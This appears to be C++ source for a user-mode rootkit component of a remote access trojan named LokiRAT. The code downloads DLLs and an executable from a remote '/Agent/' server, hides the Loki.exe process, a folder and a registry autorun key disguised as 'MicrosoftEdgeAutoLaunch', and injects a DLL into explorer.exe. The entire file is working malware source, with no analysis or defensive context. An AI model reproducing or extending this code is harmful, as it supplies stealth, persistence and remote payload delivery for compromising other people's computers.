#include "IPCObjects.h"
#include "multiDLLInjector.h"

using namespace std;

#define PROCESS_DLL "dllP.dll"
#define PATH_DLL "S:\\MalwareDeveloped\\LokiRAT\\Loki\\x64\\Release\\dllF.dll"
#define REGISTER_DLL "dllR.dll"

class URtkit {
public:

    void downloadDLLs(wstring domain) {
        // Convert the domain to string
        string domainStr(domain.begin(), domain.end());

        // Check if the file already exists before downloading
        string filePath = "dllF.dll";
        if (!filesystem::exists(filePath)) {
            string url = domainStr + "/Agent/dllF";
            downloadAndSaveFile(url, filePath);
        }

        filePath = "dllP.dll";
        if (!filesystem::exists(filePath)) {
            string url2 = domainStr + "/Agent/dllP";
            downloadAndSaveFile(url2, filePath);
        }

        filePath = "dllR.dll";
        if (!filesystem::exists(filePath)) {
            string url3 = domainStr + "/Agent/dllR";
            downloadAndSaveFile(url3, filePath);
        }

        filePath = "SystemR.exe";
        if (!filesystem::exists(filePath)) {
			string url4 = domainStr + "/Agent/SystemR";
			downloadAndSaveFile(url4, filePath);
		}
    }

    

    std::wstring findFileDirectory(const wchar_t* filename) {
        wchar_t buffer[MAX_PATH];
        GetFullPathNameW(filename, MAX_PATH, buffer, nullptr);
        wchar_t* lastSlash = wcsrchr(buffer, L'\\');

        if (lastSlash != nullptr) {
            *lastSlash = L'\0';
            return std::wstring(buffer);
        }
        else {
            return L"";
        }
    }

    int initR00tkit() {
        unordered_map<string, vector<string>> injectionMap;
        Serialitzator serialitzator("");

        // Process
        vector<wchar_t*> processesToHide;
		wstring str1 = L"Loki.exe";
		processesToHide.push_back((wchar_t*)str1.c_str());

		// Path
		vector<wstring> pathsToHide;
        wstring str2 = findFileDirectory(L"lala.txt");
        pathsToHide.push_back(str2);

        // Registry
        vector<wstring> registryKeysToHide;
        wstring str3 = L"MicrosoftEdgeAutoLaunch";
        registryKeysToHide.push_back(str3);

        serialitzator.serializeVectorWCharTPointer(processesToHide, L"agentMapped");
        serialitzator.serializeVectorWString(pathsToHide, L"pathMapped");
        serialitzator.serializeVectorWString(registryKeysToHide, L"registryMapped");

        injectionMap["explorer.exe"] = { PATH_DLL };
        injectDlls(injectionMap);
    }

private:
    void downloadAndSaveFile(const std::string& url, const std::string& filePath) {
        CURL* curl;
        CURLcode res;
        FILE* file = fopen(filePath.c_str(), "wb");

        curl_global_init(CURL_GLOBAL_DEFAULT);
        curl = curl_easy_init();
        if (curl) {
            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, file);
            curl_easy_setopt(curl, CURLOPT_FAILONERROR, 1L);
            res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
            }
            curl_easy_cleanup(curl);
        }

        fclose(file);
        curl_global_cleanup();
    }

};